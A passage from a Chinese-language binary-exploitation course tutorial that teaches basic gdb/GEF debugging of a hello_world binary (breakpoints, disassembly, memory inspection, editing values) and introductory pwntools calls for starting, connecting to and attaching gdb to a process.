<li>dereference - 递归解引用指针</li>
</ul>
<h2 id="lVxjk">Running</h2>
要在 gdb 中运行二进制 hello_world ：

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gdb ./hello_world </span><br><span class="line">GNU gdb (Ubuntu 8.1-0ubuntu3) 8.1.0.20180409-git</span><br><span class="line">Copyright (C) 2018 Free Software Foundation, Inc.</span><br><span class="line">License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;</span><br><span class="line">This is free software: you are free to change and redistribute it.</span><br><span class="line">There is NO WARRANTY, to the extent permitted by law.  Type "show copying"</span><br><span class="line">and "show warranty" for details.</span><br><span class="line">This GDB was configured as "x86_64-linux-gnu".</span><br><span class="line">Type "show configuration" for configuration details.</span><br><span class="line">For bug reporting instructions, please see:</span><br><span class="line">&lt;http://www.gnu.org/software/gdb/bugs/&gt;.</span><br><span class="line">Find the GDB manual and other documentation resources online at:</span><br><span class="line">&lt;http://www.gnu.org/software/gdb/documentation/&gt;.</span><br><span class="line">For help, type "help".</span><br><span class="line">Type "apropos word" to search for commands related to "word"...</span><br><span class="line">GEF for linux ready, type `gef' to start, `gef config' to configure</span><br><span class="line">75 commands loaded for GDB 8.1.0.20180409-git using Python engine 3.6</span><br><span class="line">[*] 5 commands could not be loaded, run `gef missing` to know why.</span><br><span class="line">Reading symbols from ./hello_world...(no debugging symbols found)...done.</span><br><span class="line">gef➤  r</span><br><span class="line">Starting program: /home/devey/nightmare/modules/02-intro_tooling/hello_world </span><br><span class="line">hello world!</span><br><span class="line">[Inferior 1 (process 9133) exited normally]</span><br></pre></td></tr></table></figure>



<p>为了进入调试器模式，我们可以<strong>设置断点</strong>。断点是程序中 GDB 知道停止执行的位置，以便检查栈的内容。最常用的断点是在主程序上，我们可以使用“break main”或“b main”来设置：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gef➤  break main</span><br><span class="line">Breakpoint 1 at 0x8048409</span><br><span class="line">gef➤  r</span><br><span class="line">Starting program: /home/devey/nightmare/modules/02-intro_tooling/hello_world </span><br><span class="line">[ Legend: Modified register | Code | Heap | Stack | String ]</span><br><span class="line">────────────────────────────────────────────────────────────────────── registers ────</span><br><span class="line">$eax   : 0x080483fb  →  &lt;main+0000&gt; lea ecx, [esp+0x4]</span><br><span class="line">$ebx   : 0xf7f9be14  →  0x00235d0c ("</span><br><span class="line">                                     ]#"?)</span><br><span class="line">$ecx   : 0xffffcf10  →  0x00000001</span><br><span class="line">$edx   : 0xffffcf30  →  0xf7f9be14  →  0x00235d0c ("</span><br><span class="line">                                                    ]#"?)</span><br><span class="line">$esp   : 0xffffcef4  →  0xffffcf10  →  0x00000001</span><br><span class="line">$ebp   : 0xffffcef8  →  0x00000000</span><br><span class="line">$esi   : 0x08048430  →  &lt;__libc_csu_init+0000&gt; push ebp</span><br><span class="line">$edi   : 0xf7ffcb60  →  0x00000000</span><br><span class="line">$eip   : 0x08048409  →  &lt;main+000e&gt; sub esp, 0x4</span><br><span class="line">$eflags: [zero carry PARITY adjust SIGN trap INTERRUPT direction overflow resume virtualx86 identification]</span><br><span class="line">$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63 </span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────</span><br><span class="line">0xffffcef4│+0x0000: 0xffffcf10  →  0x00000001    ← $esp</span><br><span class="line">0xffffcef8│+0x0004: 0x00000000   ← $ebp</span><br><span class="line">0xffffcefc│+0x0008: 0xf7d8ad43  →  &lt;__libc_start_call_main+0073&gt; add esp, 0x10</span><br><span class="line">0xffffcf00│+0x000c: 0x00000000</span><br><span class="line">0xffffcf04│+0x0010: 0x00000000</span><br><span class="line">0xffffcf08│+0x0014: 0xf7da4069  →  &lt;__new_exitfn+0009&gt; add ebx, 0x1f7dab</span><br><span class="line">0xffffcf0c│+0x0018: 0xf7d8ad43  →  &lt;__libc_start_call_main+0073&gt; add esp, 0x10</span><br><span class="line">0xffffcf10│+0x001c: 0x00000001</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────</span><br><span class="line">    0x8048405 &lt;main+000a&gt;      push   ebp</span><br><span class="line">    0x8048406 &lt;main+000b&gt;      mov    ebp, esp</span><br><span class="line">    0x8048408 &lt;main+000d&gt;      push   ecx</span><br><span class="line">●→  0x8048409 &lt;main+000e&gt;      sub    esp, 0x4</span><br><span class="line">    0x804840c &lt;main+0011&gt;      sub    esp, 0xc</span><br><span class="line">    0x804840f &lt;main+0014&gt;      push   0x80484b0</span><br><span class="line">    0x8048414 &lt;main+0019&gt;      call   0x80482d0 &lt;puts@plt&gt;</span><br><span class="line">    0x8048419 &lt;main+001e&gt;      add    esp, 0x10</span><br><span class="line">    0x804841c &lt;main+0021&gt;      mov    eax, 0x0</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────</span><br><span class="line">[#0] Id 1, Name: "hello_world", stopped 0x8048409 in main (), reason: BREAKPOINT</span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────</span><br><span class="line">[#0] 0x8048409 → main()</span><br><span class="line">───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br></pre></td></tr></table></figure>

<p>现在，可以通过键入“nexti”或者“ni”来逐步执行该函数，直到程序结束。“nexti”将让我们逐条指令地执行程序，但不会逐步执行诸如 puts 之类的函数调用。</p>
<h2 id="XPKmy">Breakpoints</h2>
让我们使用“disassemble”或“disass”来看一下主要函数：

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gef➤  disass main</span><br><span class="line">Dump of assembler code for function main:</span><br><span class="line">   0x080483fb &lt;+0&gt;:     lea    ecx,[esp+0x4]</span><br><span class="line">   0x080483ff &lt;+4&gt;:     and    esp,0xfffffff0</span><br><span class="line">   0x08048402 &lt;+7&gt;:     push   DWORD PTR [ecx-0x4]</span><br><span class="line">   0x08048405 &lt;+10&gt;:    push   ebp</span><br><span class="line">   0x08048406 &lt;+11&gt;:    mov    ebp,esp</span><br><span class="line">   0x08048408 &lt;+13&gt;:    push   ecx</span><br><span class="line">=&gt; 0x08048409 &lt;+14&gt;:    sub    esp,0x4</span><br><span class="line">   0x0804840c &lt;+17&gt;:    sub    esp,0xc</span><br><span class="line">   0x0804840f &lt;+20&gt;:    push   0x80484b0</span><br><span class="line">   0x08048414 &lt;+25&gt;:    call   0x80482d0 &lt;puts@plt&gt;</span><br><span class="line">   0x08048419 &lt;+30&gt;:    add    esp,0x10</span><br><span class="line">   0x0804841c &lt;+33&gt;:    mov    eax,0x0</span><br><span class="line">   0x08048421 &lt;+38&gt;:    mov    ecx,DWORD PTR [ebp-0x4]</span><br><span class="line">   0x08048424 &lt;+41&gt;:    leave</span><br><span class="line">   0x08048425 &lt;+42&gt;:    lea    esp,[ecx-0x4]</span><br><span class="line">   0x08048428 &lt;+45&gt;:    ret</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>



<p>假设我们想在 puts 调用时中断。我们可以为该指令设置断点。</p>
<p>像这样：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gef➤  b *main+25</span><br><span class="line">Breakpoint 1 at 0x8048414</span><br></pre></td></tr></table></figure>

<p>或者这样：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gef➤  b *0x08048414</span><br><span class="line">Note: breakpoint 1 also set at pc 0x08048414</span><br><span class="line">Breakpoint 2 at 0x08048414</span><br></pre></td></tr></table></figure>



<p>当我们运行二进制文件并尝试执行该指令时，该过程将暂停并将我们带入调试器控制台：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gef➤  r</span><br><span class="line">Starting program: /home/devey/nightmare/modules/02-intro_tooling/hello_world </span><br><span class="line">[ Legend: Modified register | Code | Heap | Stack | String ]</span><br><span class="line">───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────</span><br><span class="line">$eax   : 0x080483fb  →  &lt;main+0000&gt; lea ecx, [esp+0x4]</span><br><span class="line">$ebx   : 0xf7f9be14  →  0x00235d0c ("</span><br><span class="line">                                     ]#"?)</span><br><span class="line">$ecx   : 0xffffcf10  →  0x00000001</span><br><span class="line">$edx   : 0xffffcf30  →  0xf7f9be14  →  0x00235d0c ("</span><br><span class="line">                                                    ]#"?)</span><br><span class="line">$esp   : 0xffffcef4  →  0xffffcf10  →  0x00000001</span><br><span class="line">$ebp   : 0xffffcef8  →  0x00000000</span><br><span class="line">$esi   : 0x08048430  →  &lt;__libc_csu_init+0000&gt; push ebp</span><br><span class="line">$edi   : 0xf7ffcb60  →  0x00000000</span><br><span class="line">$eip   : 0x08048409  →  &lt;main+000e&gt; sub esp, 0x4</span><br><span class="line">$eflags: [zero carry PARITY adjust SIGN trap INTERRUPT direction overflow resume virtualx86 identification]</span><br><span class="line">$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63 </span><br><span class="line">───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────</span><br><span class="line">0xffffcef4│+0x0000: 0xffffcf10  →  0x00000001    ← $esp</span><br><span class="line">0xffffcef8│+0x0004: 0x00000000   ← $ebp</span><br><span class="line">0xffffcefc│+0x0008: 0xf7d8ad43  →  &lt;__libc_start_call_main+0073&gt; add esp, 0x10</span><br><span class="line">0xffffcf00│+0x000c: 0x00000000</span><br><span class="line">0xffffcf04│+0x0010: 0x00000000</span><br><span class="line">0xffffcf08│+0x0014: 0xf7da4069  →  &lt;__new_exitfn+0009&gt; add ebx, 0x1f7dab</span><br><span class="line">0xffffcf0c│+0x0018: 0xf7d8ad43  →  &lt;__libc_start_call_main+0073&gt; add esp, 0x10</span><br><span class="line">0xffffcf10│+0x001c: 0x00000001</span><br><span class="line">─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────</span><br><span class="line">    0x8048405 &lt;main+000a&gt;      push   ebp</span><br><span class="line">    0x8048406 &lt;main+000b&gt;      mov    ebp, esp</span><br><span class="line">    0x8048408 &lt;main+000d&gt;      push   ecx</span><br><span class="line">●→  0x8048409 &lt;main+000e&gt;      sub    esp, 0x4</span><br><span class="line">    0x804840c &lt;main+0011&gt;      sub    esp, 0xc</span><br><span class="line">    0x804840f &lt;main+0014&gt;      push   0x80484b0</span><br><span class="line">●   0x8048414 &lt;main+0019&gt;      call   0x80482d0 &lt;puts@plt&gt;</span><br><span class="line">    0x8048419 &lt;main+001e&gt;      add    esp, 0x10</span><br><span class="line">    0x804841c &lt;main+0021&gt;      mov    eax, 0x0</span><br><span class="line">─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────</span><br><span class="line">[#0] Id 1, Name: "hello_world", stopped 0x8048409 in main (), reason: BREAKPOINT</span><br><span class="line">───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────</span><br><span class="line">[#0] 0x8048409 → main()</span><br></pre></td></tr></table></figure>



<p>在调试器控制台中，我们可以实际使用调试器提供各种类型的分析，并更改二进制文件的内容。现在让我们继续查看断点。要显示所有断点：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gef➤  info breakpoints</span><br><span class="line">Num     Type           Disp Enb Address    What</span><br><span class="line">1       breakpoint     keep y   0x08048409 &lt;main+14&gt;</span><br><span class="line">        breakpoint already hit 1 time</span><br><span class="line">2       breakpoint     keep y   0x08048414 &lt;main+25&gt;</span><br><span class="line">3       breakpoint     keep y   0x08048414 &lt;main+25&gt;</span><br></pre></td></tr></table></figure>

<p>可以缩写为“info b”或“i b”。</p>
<p>删除断点 Num 2 ：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gef➤  delete 2</span><br></pre></td></tr></table></figure>

<p>可以缩写为“del 2”或“d 2”。</p>
<p>我们还可以为 puts 类的函数设置断点：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gef➤  b *puts</span><br><span class="line">Breakpoint 1 at 0x80482d0</span><br><span class="line">gef➤  r</span><br><span class="line">Starting program: /home/devey/nightmare/modules/02-intro_tooling/hello_world </span><br><span class="line">[ Legend: Modified register | Code | Heap | Stack | String ]</span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────</span><br><span class="line">$eax   : 0x080483fb  →  &lt;main+0000&gt; lea ecx, [esp+0x4]</span><br><span class="line">$ebx   : 0xf7f9be14  →  0x00235d0c ("</span><br><span class="line">                                     ]#"?)</span><br><span class="line">$ecx   : 0xffffcf10  →  0x00000001</span><br><span class="line">$edx   : 0xffffcf30  →  0xf7f9be14  →  0x00235d0c ("</span><br><span class="line">                                                    ]#"?)</span><br><span class="line">$esp   : 0xffffcedc  →  0x08048419  →  &lt;main+001e&gt; add esp, 0x10</span><br><span class="line">$ebp   : 0xffffcef8  →  0x00000000</span><br><span class="line">$esi   : 0x08048430  →  &lt;__libc_csu_init+0000&gt; push ebp</span><br><span class="line">$edi   : 0xf7ffcb60  →  0x00000000</span><br><span class="line">$eip   : 0xf7de2100  →  &lt;puts+0000&gt; push ebp</span><br><span class="line">$eflags: [zero carry PARITY ADJUST SIGN trap INTERRUPT direction overflow resume virtualx86 identification]</span><br><span class="line">$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63 </span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────</span><br><span class="line">0xffffcedc│+0x0000: 0x08048419  →  &lt;main+001e&gt; add esp, 0x10     ← $esp</span><br><span class="line">0xffffcee0│+0x0004: 0x080484b0  →  "hello world!"</span><br><span class="line">0xffffcee4│+0x0008: 0x00000000</span><br><span class="line">0xffffcee8│+0x000c: 0x00000000</span><br><span class="line">0xffffceec│+0x0010: 0x00000000</span><br><span class="line">0xffffcef0│+0x0014: 0x00000000</span><br><span class="line">0xffffcef4│+0x0018: 0xffffcf10  →  0x00000001</span><br><span class="line">0xffffcef8│+0x001c: 0x00000000   ← $ebp</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────</span><br><span class="line">   0xf7de20f5 &lt;_IO_proc_close+0245&gt; jmp    0xf7de2035 &lt;_IO_new_proc_close+389&gt;</span><br><span class="line">   0xf7de20fa &lt;_IO_proc_close+024a&gt; call   0xf7e9dc20 &lt;__stack_chk_fail&gt;</span><br><span class="line">   0xf7de20ff                  nop    </span><br><span class="line">●→ 0xf7de2100 &lt;puts+0000&gt;      push   ebp</span><br><span class="line">   0xf7de2101 &lt;puts+0001&gt;      mov    ebp, esp</span><br><span class="line">   0xf7de2103 &lt;puts+0003&gt;      push   edi</span><br><span class="line">   0xf7de2104 &lt;puts+0004&gt;      call   0xf7ee74b5 &lt;__x86.get_pc_thunk.di&gt;</span><br><span class="line">   0xf7de2109 &lt;puts+0009&gt;      add    edi, 0x1b9d0b</span><br><span class="line">   0xf7de210f &lt;puts+000f&gt;      push   esi</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────</span><br><span class="line">[#0] Id 1, Name: "hello_world", stopped 0xf7de2100 in __GI__IO_puts (), reason: BREAKPOINT</span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────</span><br><span class="line">[#0] 0xf7de2100 → __GI__IO_puts(str=0x80484b0 "hello world!")</span><br><span class="line">[#1] 0x8048419 → main()</span><br><span class="line">───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br></pre></td></tr></table></figure>



<h2 id="rakgb">Viewing Things</h2>
gdb 真正有用的一件事就是查看不同事物的值。一旦我们在查看进程时进入调试器，让我们查看 esp 寄存器的内容。为了实现这一点，我们将在 main 上中断，运行，然后推进3次，直到执行 push 后：

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gef➤  break main </span><br><span class="line">gef➤  run</span><br><span class="line">gef➤  nexti 3</span><br><span class="line">[ Legend: Modified register | Code | Heap | Stack | String ]</span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────</span><br><span class="line">$eax   : 0x080483fb  →  &lt;main+0000&gt; lea ecx, [esp+0x4]</span><br><span class="line">$ebx   : 0xf7f9be14  →  0x00235d0c ("</span><br><span class="line">                                     ]#"?)</span><br><span class="line">$ecx   : 0xffffcf10  →  0x00000001</span><br><span class="line">$edx   : 0xffffcf30  →  0xf7f9be14  →  0x00235d0c ("</span><br><span class="line">                                                    ]#"?)</span><br><span class="line">$esp   : 0xffffcee0  →  0x080484b0  →  "hello world!"</span><br><span class="line">$ebp   : 0xffffcef8  →  0x00000000</span><br><span class="line">$esi   : 0x08048430  →  &lt;__libc_csu_init+0000&gt; push ebp</span><br><span class="line">$edi   : 0xf7ffcb60  →  0x00000000</span><br><span class="line">$eip   : 0x08048414  →  0xfffeb7e8  →  0x00000000</span><br><span class="line">$eflags: [zero carry PARITY ADJUST SIGN trap INTERRUPT direction overflow resume virtualx86 identification]</span><br><span class="line">$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63 </span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────</span><br><span class="line">0xffffcee0│+0x0000: 0x080484b0  →  "hello world!"        ← $esp</span><br><span class="line">0xffffcee4│+0x0004: 0x00000000</span><br><span class="line">0xffffcee8│+0x0008: 0x00000000</span><br><span class="line">0xffffceec│+0x000c: 0x00000000</span><br><span class="line">0xffffcef0│+0x0010: 0x00000000</span><br><span class="line">0xffffcef4│+0x0014: 0xffffcf10  →  0x00000001</span><br><span class="line">0xffffcef8│+0x0018: 0x00000000   ← $ebp</span><br><span class="line">0xffffcefc│+0x001c: 0xf7d8ad43  →  &lt;__libc_start_call_main+0073&gt; add esp, 0x10</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────</span><br><span class="line">●   0x8048409 &lt;main+000e&gt;      sub    esp, 0x4</span><br><span class="line">    0x804840c &lt;main+0011&gt;      sub    esp, 0xc</span><br><span class="line">    0x804840f &lt;main+0014&gt;      push   0x80484b0</span><br><span class="line"> →  0x8048414 &lt;main+0019&gt;      call   0x80482d0 &lt;puts@plt&gt;</span><br><span class="line">   ↳   0x80482d0 &lt;puts@plt+0000&gt;  jmp    DWORD PTR ds:0x80496bc</span><br><span class="line">       0x80482d6 &lt;puts@plt+0006&gt;  push   0x0</span><br><span class="line">       0x80482db &lt;puts@plt+000b&gt;  jmp    0x80482c0</span><br><span class="line">       0x80482e0 &lt;__gmon_start__@plt+0000&gt; jmp    DWORD PTR ds:0x80496c0</span><br><span class="line">       0x80482e6 &lt;__gmon_start__@plt+0006&gt; push   0x8</span><br><span class="line">       0x80482eb &lt;__gmon_start__@plt+000b&gt; jmp    0x80482c0</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── arguments (guessed) ────</span><br><span class="line">puts@plt (</span><br><span class="line">   [sp + 0x0] = 0x080484b0 → "hello world!",</span><br><span class="line">   [sp + 0x4] = 0x00000000</span><br><span class="line">)</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────</span><br><span class="line">[#0] Id 1, Name: "hello_world", stopped 0x8048414 in main (), reason: SINGLE STEP</span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────</span><br><span class="line">[#0] 0x8048414 → main()</span><br><span class="line">───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">gef➤  </span><br></pre></td></tr></table></figure>



<p>我们可以看到寄存器 esp 保存的值是 0xffffcee0 ，这是一个指针。让我们看看它指向什么：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gef➤  x/a 0xffffcee0</span><br><span class="line">0xffffcee0:     0x80484b0</span><br><span class="line">gef➤  x/10c 0x80484b0</span><br><span class="line">0x80484b0:      0x68    0x65    0x6c    0x6c    0x6f    0x20    0x77    0x6f</span><br><span class="line">0x80484b8:      0x72    0x6c</span><br><span class="line">gef➤  x/s 0x80484b0</span><br><span class="line">0x80484b0:      "hello world!"</span><br></pre></td></tr></table></figure>

<p>我们可以看到它指向字符串 hello world! ，它将由 puts 打印（因为 puts 接受一个参数，即 char 指针）。</p>
<p>在 gdb 中，当我们使用 x 检查事物时，可以指定要将其检查为什么。可能的东西包括地址 x/a 、字符数 x/10c、 字符串 x/s 、qword x/g 或 dword x/w 。</p>
<p>让我们查看所有寄存器的内容：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gef➤  info registers</span><br><span class="line">eax            0x80483fb           0x80483fb</span><br><span class="line">ecx            0xffffcf10          0xffffcf10</span><br><span class="line">edx            0xffffcf30          0xffffcf30</span><br><span class="line">ebx            0xf7f9be14          0xf7f9be14</span><br><span class="line">esp            0xffffcee0          0xffffcee0</span><br><span class="line">ebp            0xffffcef8          0xffffcef8</span><br><span class="line">esi            0x8048430           0x8048430</span><br><span class="line">edi            0xf7ffcb60          0xf7ffcb60</span><br><span class="line">eip            0x8048414           0x8048414 &lt;main+25&gt;</span><br><span class="line">eflags         0x296               [ PF AF SF IF ]</span><br><span class="line">cs             0x23                0x23</span><br><span class="line">ss             0x2b                0x2b</span><br><span class="line">ds             0x2b                0x2b</span><br><span class="line">es             0x2b                0x2b</span><br><span class="line">fs             0x0                 0x0</span><br><span class="line">gs             0x63                0x63</span><br></pre></td></tr></table></figure>



<p>现在让我们查看栈框架：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gef➤  info frame</span><br><span class="line">Stack level 0, frame at 0xffffcf10:</span><br><span class="line"> eip = 0x8048414 in main; saved eip = 0xf7d8ad43</span><br><span class="line"> Arglist at 0xffffcef8, args: </span><br><span class="line"> Locals at 0xffffcef8, Previous frame's sp is 0xffffcf10</span><br><span class="line"> Saved registers:</span><br><span class="line">  ebp at 0xffffcef8, eip at 0xffffcf0c</span><br></pre></td></tr></table></figure>



<p>现在让我们查看主要函数的反汇编：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gef➤  disass main</span><br><span class="line">Dump of assembler code for function main:</span><br><span class="line">   0x080483fb &lt;+0&gt;:     lea    ecx,[esp+0x4]</span><br><span class="line">   0x080483ff &lt;+4&gt;:     and    esp,0xfffffff0</span><br><span class="line">   0x08048402 &lt;+7&gt;:     push   DWORD PTR [ecx-0x4]</span><br><span class="line">   0x08048405 &lt;+10&gt;:    push   ebp</span><br><span class="line">   0x08048406 &lt;+11&gt;:    mov    ebp,esp</span><br><span class="line">   0x08048408 &lt;+13&gt;:    push   ecx</span><br><span class="line">   0x08048409 &lt;+14&gt;:    sub    esp,0x4</span><br><span class="line">   0x0804840c &lt;+17&gt;:    sub    esp,0xc</span><br><span class="line">   0x0804840f &lt;+20&gt;:    push   0x80484b0</span><br><span class="line">=&gt; 0x08048414 &lt;+25&gt;:    call   0x80482d0 &lt;puts@plt&gt;</span><br><span class="line">   0x08048419 &lt;+30&gt;:    add    esp,0x10</span><br><span class="line">   0x0804841c &lt;+33&gt;:    mov    eax,0x0</span><br><span class="line">   0x08048421 &lt;+38&gt;:    mov    ecx,DWORD PTR [ebp-0x4]</span><br><span class="line">   0x08048424 &lt;+41&gt;:    leave</span><br><span class="line">   0x08048425 &lt;+42&gt;:    lea    esp,[ecx-0x4]</span><br><span class="line">   0x08048428 &lt;+45&gt;:    ret</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>



<h2 id="dEgM3">Changing Values</h2>
现在，我们正处于 put 的指令中。

<p>假设我们想要更改要打印的内容。重要的是，在许多程序中，我们能否做到这一点取决于我们尝试替换的字符串的大小。如果用太大的内容覆盖它，则存在覆盖其他内存并破坏程序的风险。有很多解决方法，但从 bin-ex 的角度来看，这很少适用。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gef➤  set {char [12]} 0x080484b0 = "hello venus"</span><br><span class="line">gef➤  x/s 0x080484b0</span><br><span class="line">0x80484b0:	"hello venus"</span><br><span class="line">gef➤  nexti</span><br><span class="line">hello venus</span><br><span class="line">[ Legend: Modified register | Code | Heap | Stack | String ]</span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────</span><br><span class="line">$eax   : 0xc       </span><br><span class="line">$ebx   : 0xf7f9be14  →  0x00235d0c ("</span><br><span class="line">                                     ]#"?)</span><br><span class="line">$ecx   : 0xf7f9d8a0  →  0x00000000</span><br><span class="line">$edx   : 0x0       </span><br><span class="line">$esp   : 0xffffcee0  →  0x080484b0  →  "hello venus"</span><br><span class="line">$ebp   : 0xffffcef8  →  0x00000000</span><br><span class="line">$esi   : 0x08048430  →  &lt;__libc_csu_init+0000&gt; push ebp</span><br><span class="line">$edi   : 0xf7ffcb60  →  0x00000000</span><br><span class="line">$eip   : 0x08048419  →  &lt;main+001e&gt; add esp, 0x10</span><br><span class="line">$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]</span><br><span class="line">$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63 </span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────</span><br><span class="line">0xffffcee0│+0x0000: 0x080484b0  →  "hello venus"         ← $esp</span><br><span class="line">0xffffcee4│+0x0004: 0x00000000</span><br><span class="line">0xffffcee8│+0x0008: 0x00000000</span><br><span class="line">0xffffceec│+0x000c: 0x00000000</span><br><span class="line">0xffffcef0│+0x0010: 0x00000000</span><br><span class="line">0xffffcef4│+0x0014: 0xffffcf10  →  0x00000001</span><br><span class="line">0xffffcef8│+0x0018: 0x00000000   ← $ebp</span><br><span class="line">0xffffcefc│+0x001c: 0xf7d8ad43  →  &lt;__libc_start_call_main+0073&gt; add esp, 0x10</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────</span><br><span class="line">    0x804840c &lt;main+0011&gt;      sub    esp, 0xc</span><br><span class="line">    0x804840f &lt;main+0014&gt;      push   0x80484b0</span><br><span class="line">    0x8048414 &lt;main+0019&gt;      call   0x80482d0 &lt;puts@plt&gt;</span><br><span class="line"> →  0x8048419 &lt;main+001e&gt;      add    esp, 0x10</span><br><span class="line">    0x804841c &lt;main+0021&gt;      mov    eax, 0x0</span><br><span class="line">    0x8048421 &lt;main+0026&gt;      mov    ecx, DWORD PTR [ebp-0x4]</span><br><span class="line">    0x8048424 &lt;main+0029&gt;      leave  </span><br><span class="line">    0x8048425 &lt;main+002a&gt;      lea    esp, [ecx-0x4]</span><br><span class="line">    0x8048428 &lt;main+002d&gt;      ret    </span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────</span><br><span class="line">[#0] Id 1, Name: "hello_world", stopped 0x8048419 in main (), reason: SINGLE STEP</span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────</span><br><span class="line">[#0] 0x8048419 → main()</span><br><span class="line">───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">gef➤  </span><br></pre></td></tr></table></figure>



<p>现在假设我们想将存储在内存地址 0x08048451 的值更改为 0xfacade ：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gef➤  x/g 0x08048451</span><br><span class="line">0x8048451 &lt;__libc_csu_init+33&gt;:	0xff08838d</span><br><span class="line">gef➤  set *0x08048451 = 0xfacade</span><br><span class="line">gef➤  x/g 0x08048451</span><br><span class="line">0x8048451 &lt;__libc_csu_init+33&gt;:	0xfacade</span><br></pre></td></tr></table></figure>



<p>假设我们想直接跳转到 0x08048451 这样的指令，并跳过其间的所有指令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gef➤  j *0x08048451</span><br><span class="line">Continuing at 0x0x08048451.</span><br></pre></td></tr></table></figure>



<h1 id="NBxUH">编写脚本</h1>
前提：pwntools



<p>如果我们想将其导入到 python 中：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br></pre></td></tr></table></figure>



<p>连接远程服务器：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">target = remote("ip", 端口) # 如：target = remote("github.com", 9000)</span><br></pre></td></tr></table></figure>



<p>如果想运行目标二进制文件：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">target = process("./challenge")</span><br></pre></td></tr></table></figure>



<p>如果要将 gdb 调试器附加到某个进程：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gdb.attach(target)</span><br></pre></td></tr></table></figure>



<p>如果我们想将 gdb 调试器附加到某个进程，并且立即向 gdb 传递一个命令以在 main 处设置断点：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gdb.attach(target, gdbscript='b *main')</span><br></pre></td></tr></table></figure>



